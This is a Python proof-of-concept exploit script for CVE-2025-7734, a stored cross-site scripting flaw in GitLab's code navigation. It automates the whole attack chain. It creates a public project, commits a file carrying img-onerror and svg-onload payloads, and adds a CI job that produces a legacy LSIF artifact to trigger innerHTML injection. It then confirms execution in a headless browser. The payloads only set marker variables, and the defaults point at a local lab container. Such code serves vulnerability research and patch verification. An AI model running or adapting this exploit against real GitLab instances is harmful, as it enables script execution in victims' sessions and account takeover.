#!/usr/bin/env python3
"""
Exploit Intelligence Platform (EIP) — https://exploit-intel.com
@exploit_intel

CVE-2025-7734: Stored XSS in GitLab CE/EE Blob Viewer via Code Navigation

Demonstrates a stored cross-site scripting vulnerability in GitLab's code navigation
feature. When a repository contains both:
  1. A source file with HTML/JS content (e.g., <img/src/onerror=alert()>)
  2. A legacy LSIF code intelligence artifact (without end_line property)

The wrapNodes() function in dom_utils.js assigns textContent to innerHTML,
causing the HTML in the source file to be parsed and executed as live DOM.

Attack Surface: Code Navigation wrapNodes() (Primary Vector)

Requires:
  - Authenticated GitLab user with Developer role (write access)
  - GitLab CE/EE 14.2.0 through 18.0.5 / 18.1.3 / 18.2.1

Usage:
  python3 poc.py <gitlab_host> [--token TOKEN] [--password PASSWORD]
  python3 poc.py localhost --port 8880 --token glpat-xxxx
  python3 poc.py localhost --port 8880 --password LabPass2025!
"""

import argparse
import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import zipfile
import io
import tempfile

# ─── Configuration ──────────────────────────────────────────────────────────────

DEFAULT_HOST = "gitlab.local"
PROJECT_NAME = "cve-2025-7734-poc"
XSS_MARKER = "CVE-2025-7734-XSS-TRIGGERED"

# XSS payloads embedded as valid Python source code
PAYLOAD_FILE_CONTENT = f'''# payload.py - CVE-2025-7734 PoC
# This file contains XSS payloads that trigger via GitLab's code navigation feature
# when a legacy LSIF artifact (without end_line) is present for this file.

variable = "<img/src/onerror=window.__xss_marker='{XSS_MARKER}'>"
another = "<svg/onload=window.__xss_marker2='SVG-{XSS_MARKER}'>"
'''

# Legacy LSIF data (no end_line → forces deprecatedNodeUpdate → wrapNodes → innerHTML XSS)
LSIF_DATA = [
    {
        "start_line": 4,  # Line with <img> payload (0-indexed)
        "start_char": 0,
        "hover": {
            "language": "python",
            "value": "variable: str"
        }
        # NOTE: No "end_line" property — this is the KEY trigger for the vulnerability.
        # When end_line is undefined, addInteractionClass() routes to deprecatedNodeUpdate()
        # which calls wrapNodes(elm.textContent, ...) → assigns to innerHTML → XSS
    },
    {
        "start_line": 5,  # Line with <svg> payload
        "start_char": 0,
        "hover": {
            "language": "python",
            "value": "another: str"
        }
        # Also no end_line
    }
]


# ─── Helper Functions ───────────────────────────────────────────────────────────

def gitlab_api(base_url, endpoint, token, method="GET", data=None, host="gitlab.local"):
    """Make an authenticated GitLab API request."""
    url = f"{base_url}/api/v4{endpoint}"
    headers = {
        "PRIVATE-TOKEN": token,
        "Host": host,
        "Content-Type": "application/json"
    }

    if data is not None:
        data = json.dumps(data).encode("utf-8")

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode("utf-8")
            return json.loads(body) if body.strip() else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"  [!] HTTP {e.code} on {method} {endpoint}: {body[:200]}")
        raise


def gitlab_graphql(base_url, token, query, host="gitlab.local"):
    """Execute a GitLab GraphQL query."""
    url = f"{base_url}/api/graphql"
    headers = {
        "PRIVATE-TOKEN": token,
        "Host": host,
        "Content-Type": "application/json"
    }
    data = json.dumps({"query": query}).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read().decode("utf-8"))


def create_lsif_zip(lsif_data, filename="payload.py"):
    """Create an in-memory ZIP archive containing the LSIF JSON data.

    The ZIP structure must match what GitLab expects:
      lsif/<filename>.json
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        json_path = f"lsif/{filename}.json"
        zf.writestr(json_path, json.dumps(lsif_data))
    return buf.getvalue()


def get_session_cookie(base_url, username, password, host="gitlab.local"):
    """Get a GitLab session cookie by logging in via the web interface."""
    import http.client
    from html.parser import HTMLParser

    parsed = urllib.parse.urlparse(base_url)
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=30)

    # Step 1: GET login page to get CSRF token
    conn.request("GET", "/users/sign_in", headers={"Host": host})
    resp = conn.getresponse()
    html = resp.read().decode("utf-8", errors="replace")
    cookies = []
    for h in resp.getheaders():
        if h[0].lower() == "set-cookie":
            cookies.append(h[1].split(";")[0])

    # Parse CSRF token
    class CSRFParser(HTMLParser):
        token = None
        def handle_starttag(self, tag, attrs):
            d = dict(attrs)
            if tag == "meta" and d.get("name") == "csrf-token":
                self.token = d.get("content")
            if tag == "input" and d.get("name") == "authenticity_token":
                self.token = d.get("value")

    parser = CSRFParser()
    parser.feed(html)
    csrf = parser.token

    if not csrf:
        print("  [!] Could not find CSRF token on login page")
        return None, None

    # Step 2: POST login
    form_data = urllib.parse.urlencode({
        "authenticity_token": csrf,
        "user[login]": username,
        "user[password]": password,
        "user[remember_me]": "0"
    })
    headers = {
        "Host": host,
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "; ".join(cookies),
    }
    conn.request("POST", "/users/sign_in", body=form_data, headers=headers)
    resp = conn.getresponse()
    resp.read()

    session_cookies = list(cookies)  # keep existing
    for h in resp.getheaders():
        if h[0].lower() == "set-cookie":
            session_cookies.append(h[1].split(";")[0])

    cookie_str = "; ".join(session_cookies)
    return cookie_str, csrf


# ─── Main Exploit ───────────────────────────────────────────────────────────────

def exploit(target_host, target_port, token=None, password=None, host_header="gitlab.local",
            skip_setup=False, project_id=None, headless_verify=True):
    """
    Full exploit chain for CVE-2025-7734:
      1. Create a project with a source file containing XSS payload
      2. Create CI config that generates legacy LSIF artifact
      3. Trigger CI pipeline to produce the LSIF artifact
      4. Verify the LSIF data is served (no end_line → vulnerable code path)
      5. Use headless browser to verify XSS execution in blob viewer
    """
    base_url = f"http://{target_host}:{target_port}" if target_port != 80 else f"http://{target_host}"

    print("=" * 70)
    print(f"CVE-2025-7734: Stored XSS in GitLab Code Navigation")
    print(f"Target: {base_url}")
    print("=" * 70)

    # ── Step 0: Obtain API token ─────────────────────────────────────────────
    if not token and password:
        print("\n[*] Step 0: Obtaining API token via OAuth...")
        try:
            data = urllib.parse.urlencode({
                "grant_type": "password",
                "username": "root",
                "password": password
            }).encode()
            req = urllib.request.Request(
                f"{base_url}/oauth/token",
                data=data,
                headers={"Host": host_header, "Content-Type": "application/x-www-form-urlencoded"}
            )
            with urllib.request.urlopen(req, timeout=30) as resp:
                oauth_data = json.loads(resp.read())
                # Create a personal access token instead
                print("  [+] OAuth successful, creating personal access token...")
        except Exception as e:
            print(f"  [!] OAuth failed: {e}")
            print("  [*] Trying with provided token or password directly...")

    if not token:
        # Try to create a PAT via Rails console (only works when we have docker access)
        print("  [*] Creating PAT via Rails console...")
        result = subprocess.run(
            ["docker", "exec", "cve-2025-7734-gitlab", "gitlab-rails", "runner",
             'user = User.find_by_username("root"); '
             'token = user.personal_access_tokens.create!(name: "poc-token", '
             'scopes: [:api, :read_repository, :write_repository], '
             f'expires_at: {365}.days.from_now); '
             'puts token.token'],
            capture_output=True, text=True, timeout=120
        )
        if result.returncode == 0:
            token = result.stdout.strip().split("\n")[-1]
            print(f"  [+] Created PAT: {token[:15]}...")
        else:
            print(f"  [!] Failed to create PAT: {result.stderr[:200]}")
            sys.exit(1)

    # ── Step 1: Create project ───────────────────────────────────────────────
    pid = project_id
    if not skip_setup:
        print(f"\n[*] Step 1: Creating project '{PROJECT_NAME}'...")
        try:
            proj = gitlab_api(base_url, "/projects", token, method="POST", data={
                "name": PROJECT_NAME,
                "initialize_with_readme": True,
                "visibility": "public"
            }, host=host_header)
            pid = proj["id"]
            print(f"  [+] Project created: id={pid}, path={proj['path_with_namespace']}")
        except urllib.error.HTTPError as e:
            if e.code == 400:
                # Project might already exist
                print("  [*] Project may already exist, trying to find it...")
                projects = gitlab_api(base_url, f"/projects?search={PROJECT_NAME}&owned=true",
                                      token, host=host_header)
                for p in projects:
                    if p["name"] == PROJECT_NAME:
                        pid = p["id"]
                        print(f"  [+] Found existing project: id={pid}")
                        break
                if not pid:
                    raise
            else:
                raise

        # ── Step 2: Create payload source file ──────────────────────────────────
        print("\n[*] Step 2: Creating payload file with XSS content...")
        try:
            gitlab_api(base_url, f"/projects/{pid}/repository/files/payload.py", token,
                       method="POST", data={
                           "branch": "main",
                           "content": PAYLOAD_FILE_CONTENT,
                           "commit_message": "Add payload file for code navigation test"
                       }, host=host_header)
            print("  [+] payload.py created")
        except urllib.error.HTTPError:
            # File might already exist, try updating
            try:
                gitlab_api(base_url, f"/projects/{pid}/repository/files/payload.py", token,
                           method="PUT", data={
                               "branch": "main",
                               "content": PAYLOAD_FILE_CONTENT,
                               "commit_message": "Update payload file"
                           }, host=host_header)
                print("  [+] payload.py updated")
            except Exception:
                print("  [*] payload.py already exists, continuing...")

        # ── Step 3: Create CI configuration ──────────────────────────────────────
        print("\n[*] Step 3: Creating .gitlab-ci.yml with LSIF artifact job...")
        lsif_json = json.dumps(LSIF_DATA)
        ci_content = f"""code_navigation:
  tags:
    - poc
  script:
    - mkdir -p lsif
    - echo '{lsif_json}' > lsif/payload.py.json
  artifacts:
    reports:
      lsif: lsif/payload.py.json
"""
        try:
            gitlab_api(base_url, f"/projects/{pid}/repository/files/.gitlab-ci.yml", token,
                       method="POST", data={
                           "branch": "main",
                           "content": ci_content,
                           "commit_message": "Add code navigation CI job"
                       }, host=host_header)
            print("  [+] .gitlab-ci.yml created")
        except urllib.error.HTTPError:
            try:
                gitlab_api(base_url, f"/projects/{pid}/repository/files/.gitlab-ci.yml", token,
                           method="PUT", data={
                               "branch": "main",
                               "content": ci_content,
                               "commit_message": "Update CI config"
                           }, host=host_header)
                print("  [+] .gitlab-ci.yml updated")
            except Exception:
                print("  [*] .gitlab-ci.yml already exists, continuing...")

    if not pid:
        print("[!] No project ID available. Use --project-id or let setup run.")
        sys.exit(1)

    # ── Step 4: Wait for pipeline / Create artifact manually ─────────────────
    print("\n[*] Step 4: Checking pipeline and LSIF artifact status...")

    # Check if a pipeline ran
    pipelines = gitlab_api(base_url, f"/projects/{pid}/pipelines?per_page=5", token, host=host_header)
    pipeline_id = None
    job_id = None

    for pl in pipelines:
        jobs = gitlab_api(base_url, f"/projects/{pid}/pipelines/{pl['id']}/jobs", token, host=host_header)
        for j in jobs:
            if j["name"] == "code_navigation":
                pipeline_id = pl["id"]
                job_id = j["id"]
                job_status = j["status"]
                print(f"  [*] Found job {job_id} in pipeline {pipeline_id}: status={job_status}")

                # Check if LSIF artifact exists
                artifacts = j.get("artifacts", [])
                has_lsif = any(a.get("file_type") == "lsif" for a in artifacts)

                if job_status == "pending" or job_status == "running":
                    print("  [*] Waiting for job to complete...")
                    for _ in range(60):
                        time.sleep(5)
                        j2 = gitlab_api(base_url, f"/projects/{pid}/jobs/{job_id}", token, host=host_header)
                        if j2["status"] in ("success", "failed"):
                            job_status = j2["status"]
                            has_lsif = any(a.get("file_type") == "lsif" for a in j2.get("artifacts", []))
                            break
                    print(f"  [*] Job completed: status={job_status}")
                break
        if job_id:
            break

    # ── Step 5: Verify LSIF data is served ───────────────────────────────────
    print("\n[*] Step 5: Verifying LSIF code navigation data endpoint...")

    # Determine actual project path from API
    try:
        proj_data = gitlab_api(base_url, f"/projects/{pid}", token, host=host_header)
        project_full_path = proj_data.get("path_with_namespace", f"root/{PROJECT_NAME}")
    except Exception:
        project_full_path = f"root/{PROJECT_NAME}"

    # Use GraphQL to get the code navigation path
    gql_query = '''
    query {
      project(fullPath: "%s") {
        repository {
          blobs(paths: ["payload.py"], ref: "main") {
            nodes {
              name
              codeNavigationPath
            }
          }
        }
      }
    }
    ''' % project_full_path

    gql_resp = gitlab_graphql(base_url, token, gql_query, host=host_header)

    # Safely navigate the nested response
    data = gql_resp.get("data") or {}
    project_data = data.get("project") or {}
    repo_data = project_data.get("repository") or {}
    blobs_data = repo_data.get("blobs") or {}
    blobs = blobs_data.get("nodes") or []

    if not blobs and gql_resp.get("errors"):
        print(f"  [!] GraphQL errors: {gql_resp['errors']}")

    code_nav_path = None
    if blobs:
        code_nav_path = blobs[0].get("codeNavigationPath")
        print(f"  [+] Code navigation path: {code_nav_path}")
    else:
        print("  [!] No blob data returned from GraphQL")

    if code_nav_path:
        # Fetch the LSIF data
        lsif_url = f"{base_url}{code_nav_path}"
        req = urllib.request.Request(lsif_url, headers={
            "PRIVATE-TOKEN": token,
            "Host": host_header
        })
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                lsif_response = json.loads(resp.read().decode("utf-8"))
                print(f"  [+] LSIF data retrieved: {len(lsif_response)} entries")
                for entry in lsif_response:
                    has_end_line = "end_line" in entry
                    print(f"      start_line={entry['start_line']}, "
                          f"has_end_line={has_end_line} "
                          f"{'(SAFE - new format)' if has_end_line else '(VULNERABLE - legacy format)'}")
                if not any("end_line" in e for e in lsif_response):
                    print("\n  [!!!] ALL LSIF entries lack end_line → deprecatedNodeUpdate() will be used")
                    print("  [!!!] wrapNodes(elm.textContent, ...) will assign to innerHTML → XSS")
        except urllib.error.HTTPError as e:
            print(f"  [!] Failed to fetch LSIF data: HTTP {e.code}")
            print("  [*] The artifact may need to be created via CI pipeline or Rails console")

    actual_project_path = project_full_path

    # ── Step 6: Fetch blob viewer page and check for vulnerability ───────────
    print("\n[*] Step 6: Checking blob viewer page for XSS payload in source...")
    blob_url = f"{base_url}/{actual_project_path}/-/blob/main/payload.py"
    req = urllib.request.Request(blob_url, headers={
        "PRIVATE-TOKEN": token,
        "Host": host_header
    })
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            page_html = resp.read().decode("utf-8", errors="replace")

        # The source file content should be rendered with syntax highlighting
        # The XSS payload text is in <span> elements within the code viewer
        if "img/src/onerror" in page_html or "onerror=alert" in page_html:
            print("  [+] XSS payload found in blob viewer HTML (rendered as text in code spans)")
            print("  [+] When code navigation processes this, textContent → innerHTML = XSS")
        elif "<img" in page_html:
            print("  [+] <img> tag content present in page")
        else:
            print("  [*] Page loaded but payload text not found in initial HTML")
            print("      (The blob viewer may load content asynchronously via JavaScript)")
    except Exception as e:
        print(f"  [!] Failed to load blob page: {e}")

    # ── Step 7: Headless browser verification ────────────────────────────────
    print("\n[*] Step 7: Headless browser XSS verification...")

    if headless_verify:
        try:
            xss_confirmed = verify_xss_headless(base_url, host_header, token, password or "LabPass2025!",
                                                 project_path=actual_project_path)
            if xss_confirmed:
                print("\n" + "=" * 70)
                print("[+] VULNERABILITY CONFIRMED: CVE-2025-7734 XSS TRIGGERED!")
                print("=" * 70)
                return True
            else:
                print("\n  [*] Headless browser test inconclusive")
                print("      (XSS may require specific browser/JS engine conditions)")
        except Exception as e:
            print(f"  [!] Headless browser test failed: {e}")
            import traceback
            traceback.print_exc()

    # ── Summary ──────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("EXPLOIT CHAIN SUMMARY:")
    print("=" * 70)
    print(f"  Target:           {base_url}")
    print(f"  Project:          {actual_project_path} (id={pid})")
    print(f"  Payload file:     payload.py (contains <img/src/onerror=...>)")
    print(f"  LSIF artifact:    Legacy format (no end_line)")
    print(f"  Code nav path:    {code_nav_path}")
    print(f"  Victim URL:       {blob_url}")
    print()
    print("  VULNERABLE CODE PATH:")
    print("  1. Victim opens blob viewer for payload.py")
    print("  2. Frontend fetches LSIF data (no end_line → legacy format)")
    print("  3. deprecatedNodeUpdate() called (line has no end_line)")
    print("  4. wrapNodes(elm.textContent, ...) runs on code spans")
    print("  5. textContent '<img/src/onerror=alert()>' assigned to innerHTML")
    print("  6. Browser parses <img> tag → onerror fires → JavaScript executes")
    print("=" * 70)

    return code_nav_path is not None


def verify_xss_headless(base_url, host_header, token, password, project_path=None):
    """Use Playwright headless browser to verify XSS execution."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("  [!] Playwright not installed. Install with: pip install playwright && playwright install chromium")
        return False

    xss_triggered = False

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-web-security"]
        )
        context = browser.new_context(
            extra_http_headers={"Host": host_header},
            ignore_https_errors=True
        )
        page = context.new_page()

        # Capture console messages and JS errors
        console_messages = []
        page.on("console", lambda msg: console_messages.append(msg.text))

        # Set up alert dialog handler (XSS indicator)
        dialog_messages = []
        def handle_dialog(dialog):
            nonlocal xss_triggered
            dialog_messages.append(dialog.message)
            xss_triggered = True
            print(f"  [+] ALERT DIALOG DETECTED: '{dialog.message}'")
            dialog.accept()
        page.on("dialog", handle_dialog)

        print(f"  [*] Navigating to GitLab login page...")
        page.goto(f"{base_url}/users/sign_in", wait_until="domcontentloaded", timeout=60000)

        # Login
        print(f"  [*] Logging in as root...")
        page.fill("#user_login", "root")
        page.fill("#user_password", password)
        page.click('input[type="submit"], button[type="submit"]')
        page.wait_for_load_state("networkidle", timeout=30000)

        current_url = page.url
        if "/users/sign_in" in current_url:
            print("  [!] Login may have failed, still on sign_in page")
            # Try alternative login
            page.fill("#user_login", "root")
            page.fill("#user_password", password)
            page.click('input[type="submit"], button[type="submit"]')
            page.wait_for_load_state("networkidle", timeout=30000)

        print(f"  [+] Logged in. Current URL: {page.url}")

        # Navigate to the vulnerable blob page
        proj = project_path or f"root/{PROJECT_NAME}"
        blob_url = f"{base_url}/{proj}/-/blob/main/payload.py"
        print(f"  [*] Navigating to blob viewer: {blob_url}")
        page.goto(blob_url, wait_until="domcontentloaded", timeout=60000)
        page.wait_for_load_state("networkidle", timeout=30000)

        # Wait for code navigation to process (it runs after page load)
        print("  [*] Waiting for code navigation JS to execute...")
        time.sleep(5)

        # Check for XSS markers
        xss_marker_value = page.evaluate("() => window.__xss_marker || null")
        xss_marker2_value = page.evaluate("() => window.__xss_marker2 || null")

        if xss_marker_value:
            print(f"  [+] XSS MARKER 1 FOUND: window.__xss_marker = '{xss_marker_value}'")
            xss_triggered = True
        if xss_marker2_value:
            print(f"  [+] XSS MARKER 2 FOUND: window.__xss_marker2 = '{xss_marker2_value}'")
            xss_triggered = True

        # Also check for any img elements with onerror that were injected
        injected_imgs = page.evaluate("""() => {
            const imgs = document.querySelectorAll('img[src=""]');
            return imgs.length;
        }""")
        if injected_imgs > 0:
            print(f"  [+] Found {injected_imgs} injected <img> element(s) with empty src (XSS vector)")
            xss_triggered = True

        # Check for SVG injections
        injected_svgs = page.evaluate("""() => {
            // Look for SVGs that were injected via innerHTML (not legitimate GitLab SVGs)
            const codeBlock = document.querySelector('.blob-content, .file-content, #blob-content-holder');
            if (!codeBlock) return 0;
            return codeBlock.querySelectorAll('svg').length;
        }""")
        if injected_svgs > 0:
            print(f"  [+] Found {injected_svgs} injected <svg> element(s) in code block")
            xss_triggered = True

        # Check if the code navigation data was loaded
        nav_data_loaded = page.evaluate("""() => {
            // Check Vuex store for code navigation data
            const app = document.querySelector('[data-code-navigation-path]');
            return app !== null;
        }""")
        print(f"  [*] Code navigation element present: {nav_data_loaded}")

        # Log any console output for debugging
        if console_messages:
            print(f"  [*] Browser console messages ({len(console_messages)}):")
            for msg in console_messages[:10]:
                print(f"      > {msg[:120]}")

        # Take screenshot for evidence
        screenshot_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xss_evidence.png")
        page.screenshot(path=screenshot_path, full_page=True)
        print(f"  [*] Screenshot saved: {screenshot_path}")

        # Dump relevant DOM for analysis
        code_html = page.evaluate("""() => {
            const blob = document.querySelector('.blob-content, .file-content, #blob-content-holder');
            return blob ? blob.innerHTML.substring(0, 2000) : 'NOT FOUND';
        }""")
        print(f"\n  [*] Blob content DOM (first 500 chars):")
        print(f"      {code_html[:500]}")

        browser.close()

    return xss_triggered


# ─── Entry Point ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-7734: Stored XSS in GitLab Code Navigation"
    )
    parser.add_argument("target", nargs="?", default="localhost",
                        help="GitLab server IP/hostname (default: localhost)")
    parser.add_argument("--port", type=int, default=8880,
                        help="GitLab HTTP port (default: 8880)")
    parser.add_argument("--token", default=None,
                        help="GitLab Personal Access Token")
    parser.add_argument("--password", default="LabPass2025!",
                        help="Root password (default: LabPass2025!)")
    parser.add_argument("--host-header", default="gitlab.local",
                        help="Host header for requests (default: gitlab.local)")
    parser.add_argument("--skip-setup", action="store_true",
                        help="Skip project/file creation (use existing)")
    parser.add_argument("--project-id", type=int, default=None,
                        help="Use existing project ID")
    parser.add_argument("--no-headless", action="store_true",
                        help="Skip headless browser verification")

    args = parser.parse_args()

    success = exploit(
        target_host=args.target,
        target_port=args.port,
        token=args.token,
        password=args.password,
        host_header=args.host_header,
        skip_setup=args.skip_setup,
        project_id=args.project_id,
        headless_verify=not args.no_headless
    )

    sys.exit(0 if success else 1)
